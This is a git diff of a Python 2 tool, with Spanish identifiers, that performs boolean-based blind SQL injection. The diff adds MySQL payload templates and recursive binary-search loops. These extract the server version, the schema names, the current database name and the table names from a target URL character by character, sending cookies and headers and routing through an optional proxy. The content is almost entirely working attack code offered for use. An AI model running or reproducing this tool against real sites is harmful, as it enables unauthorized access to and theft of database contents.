@@ -34,9 +34,11 @@ class Injection:
 		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
 	}
 	catalogoMySQL={
-		'version':["' and   ascii(substring(@@version,1,1))","'","and   ascii(substring(@@version,","))","-- -+"],
-		'tablas':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
-		'datos ':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
+		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
+		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
+		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
+		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"]
+
 	}
 	catalogoPostgres={
 		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
@@ -91,36 +93,50 @@ class Injection:
 		else:
 			self.proxy = self.proxy = {"http":proxy}
 	@staticmethod
-	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
+	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where):
 		
 		
 		caracter = chr(Injection.getMid(up,down))
 		print "up: ",up," car: ",ord(caracter)," down:",down
-		coord = str(fila)+","+str(columna)
+		if tipo == "version":
+			coord = str(fila)+","+str(columna)
+			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
+		elif tipo == "bases":
+			coord = str(columna)+"),"+str(fila)+",1"
+			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
+		elif tipo == "current":
+			coord = str(fila)+","+str(columna)
+			direccion = obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]
+		elif tipo == "tablas":
+			coord = "," + str(fila)+",1"
+			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
+
+
 		print "Coordenada: "+coord
-		consulta = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
+		consulta = requests.get(url=direccion+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 		if consulta.text == ok:
 			return caracter
 		elif (consulta.text != ok) and (up == down ):
 			return "No encontrado"
 		else:
-			print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
+			print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
 
-			consulta2 = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
+			consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
 
 				
 			if consulta2.text == ok:
 				print "iguales"
 				print "up: ",up," down(car): ",ord(caracter)
 				print ""
-				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna)
+				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where)
 			else:
 				print "up(car): ",ord(caracter)," down:",down
 				print ""
 				down2=down
 				if (down2 + 1) == ord(caracter):
-					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna)
-				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna)
+					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where)
+				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where)
 			
 		
 			
@@ -152,16 +168,90 @@ class Injection:
 							database = "mysql"
 							print "Base de datos detectada: ",database
 							char = ""
-							version = ""
 							indiceY = 1
+###=========Version============= 
+							version = ""
 							while char != "No encontrado":
-								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1)
+								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1,"")
 								print "Caracter: "+char
 								if char != "No encontrado":
 									version += char
 									indiceY = indiceY +1
-							print "Version: "+version
 							
+###=========Bases===============
+							print "Bases:"
+							indiceY	= 1
+							indiceX = 0
+							bandera = 0
+							base = ""
+							bases = {}
+							while char == "No encontrado" and bandera != 1:
+								char = ""
+								while char != "No encontrado":
+									
+									char =self.busqueda(self,self.catalogoMySQL,"bases",pagina.text,126,32,indiceY,indiceX,"")
+									print "Caracter: "+char
+									if char != "No encontrado":
+										base += char
+										indiceY = indiceY +1
+								bases[base] = [""]
+								print "BASE: "+base
+								base = ""
+								indiceX = indiceX + 1
+								bandera = indiceY
+								indiceY = 1
+###=========Current============= 
+
+							current = ""
+							char = ""
+							while char != "No encontrado":
+								char =self.busqueda(self,self.catalogoMySQL,"current",pagina.text,126,32,indiceY,1,"")
+								print "Caracter: "+char
+								if char != "No encontrado":
+									current += char
+									indiceY = indiceY +1
+
+# ##==========Tablas============
+							print "Tablas:"
+							indiceY	= 1
+							indiceX = 0
+							bandera = 0
+							tabla = ""
+							for where in bases.keys():
+								bandera = 0
+								indiceY	= 1
+								indiceX = 0
+								condicion = "WHERE table_schema = '"+where+"'"
+								print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
+								while char == "No encontrado" and bandera != 1:
+									char = ""
+									print "lol"
+									while char != "No encontrado":
+										
+										char =self.busqueda(self,self.catalogoMySQL,"tablas",pagina.text,126,32,indiceY,indiceX,condicion)
+										print "Caracter: "+char
+										if char != "No encontrado":
+											tabla += char
+											indiceY = indiceY +1
+									bases[where].append(tabla)
+									print "TABLA: "+tabla
+									tabla = ""
+									indiceX = indiceX + 1
+									bandera = indiceY
+									indiceY = 1
+
+
+
+
+
+
+
+##======================== Resultados
+							print "\nCurrent Database: "+current
+							print "Version: "+version
+							#print bases[:len(bases)-1]
+							print bases
+
 						else:
 							database = "mssql"
 							print "Base de datos detectada: ",database
